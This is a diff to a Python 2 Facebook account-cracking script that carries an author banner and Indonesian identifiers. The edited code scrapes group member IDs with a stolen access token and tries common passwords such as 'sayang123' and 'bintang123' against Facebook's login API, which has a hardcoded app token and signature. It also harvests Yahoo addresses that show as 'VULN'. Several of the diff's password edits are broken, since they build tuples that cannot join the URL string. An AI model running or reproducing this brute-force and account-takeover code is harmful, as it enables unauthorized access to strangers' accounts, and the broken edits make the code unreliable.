@@ -47,6 +47,7 @@ logo = """\033[1;97m█████████
 \033[1;97m║\033[1;93m* \033[1;97mRecode  \033[1;91m: \033[1;96mThe Magizz \033[1;97m                 ║
 \033[1;97m║\033[1;93m* \033[1;97mGithub  \033[1;91m: \033[1;96mhttps://github.com/TheMagizz\033[1;97m║
 \033[1;97m║\033[1;93m* \033[1;97mFB      \033[1;91m: \033[1;92m\033[4mhttps://fb.me/rizz.magizz\033[0m   \033[1;97m║
+\033[1;97m║\033[1;93m* \033[1;97mVersion \033[1;91m: \033[1;92m\033[4m1.0.0\033[0m                       \033[1;97m║
 \033[1;97m╚════════════════════════════════════════╝"""
 
 # titik #
@@ -87,7 +88,7 @@ def masuk():
 	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Login using token"
 	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Exit"
 	print "\033[1;97m║"
-	msuk = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
+	msuk = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
 	if msuk =="":
 		print"\033[1;91m[!] Wrong input"
 		keluar()
@@ -224,7 +225,7 @@ def menu():
 	pilih()
 #-
 def pilih():
-	zedd = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
+	zedd = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
 	if zedd =="":
 		print "\033[1;91m[!] Wrong input"
 		pilih()
@@ -345,7 +346,7 @@ def dump():
 	dump_pilih()
 #-----pilih
 def dump_pilih():
-	cuih = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
+	cuih = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
 	if cuih =="":
 		print "\033[1;91m[!] Wrong input"
 		dump_pilih()
@@ -932,7 +933,7 @@ def menu_hack():
 	hack_pilih()
 #----pilih
 def hack_pilih():
-	hack = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
+	hack = raw_input("\033[1;97m╚═\033[1;91m>>> \033[1;97m")
 	if hack=="":
 		print "\033[1;91m[!] Wrong input"
 		hack_pilih()
@@ -1101,7 +1102,7 @@ def mini():
 														raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 														menu_hack()
 													else:
-														pz7 = "sayang123"
+														pz7 = "sayang123, sayang, bintang, bajingan, someone, anjing, pukimak, playboy, doraemon, bahagia"
 														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 														y = json.load(data)
 														if 'access_token' in y:
@@ -1277,7 +1278,7 @@ def pilih_super():
 			raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 			super()
 		jalan('\033[1;91m[✺] \033[1;92mGet group member id \033[1;97m...')
-		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=999999999&access_token='+toket)
+		re=requests.get('https://graph.facebook.com/'+idg+'/members?fields=name,id&limit=99999999999&access_token='+toket)
 		s=json.loads(re.text)
 		for p in s['data']:
 			id.append(p['id'])
@@ -1384,7 +1385,7 @@ def pilih_super():
 											cekpoint.append(user+pass4)
 										else:
 											#Pass5
-											pass5 = "sayang123"
+											pass5 = "sayang123", "sayangku123"
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -1400,7 +1401,7 @@ def pilih_super():
 													cekpoint.append(user+pass5)
 												else:
 													#Pass6
-													pass6 = "bintang123"
+													pass6 = "bintang123", " bintang12345"
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -1418,7 +1419,7 @@ def pilih_super():
 															#Pass7
 															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
 															b = json.loads(a.text)
-															pass7 = "sayang, doraemon, bintang, someone, bajingan, anjing, pukimak, playboy"
+															pass7 = "sayang", "doraemon", "bintang", "someone", "bajingan", "anjing", "pukimak", "playboy"
 															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 															q = json.load(data)
 															if 'access_token' in q:
@@ -1806,9 +1807,9 @@ def yahoolist():
 			klik = br.submit().read()
 			jok = re.compile(r'"messages.ERROR_INVALID_USERNAME">.*')
 			try:
-				pek = jok.search(klik).group()
+			        pek = jok.search(klik).group()
 			except:
-				continue
+			        continue
 			if '"messages.ERROR_INVALID_USERNAME">' in pek:
 				save.write(mail + '\n')
 				print("\033[1;97m[ \033[1;92mVULN✓\033[1;97m ] \033[1;92m" +mail)
